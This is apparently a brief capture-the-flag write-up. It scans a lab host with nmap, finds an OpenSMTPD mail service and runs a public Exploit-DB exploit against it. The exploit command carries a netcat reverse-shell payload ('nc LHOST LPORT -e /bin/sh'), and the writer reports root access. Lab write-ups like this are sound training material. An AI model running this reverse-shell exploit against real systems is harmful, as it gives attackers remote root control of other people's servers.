<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.0.100.33 -T4  -v -p-```

```
```
From our nmap scan we can see only 1 open port. Our enumeration today will be focused on that port




# Enumeration

The smtp server is running ```OpenSMPTD```

I found that, you can get the exploit [here](https://www.exploit-db.com/exploits/47984)

Now that we've found the exploit, lets exploit this




# Exploitation

Lets run the exploit

command:```python3 47984.py 10.0.100.33 25 'nc LHOST LPORT -e /bin/sh'```

Ensure you set your ```LHOST``` and ```LPORT```

Also, before running, lets set our netcat listener

Good.

Running the exploit

We got a shell as the ```root``` user. This was quite easy

Well, this means we have successfully pwned this boxðŸ˜Ž



That will be all for today
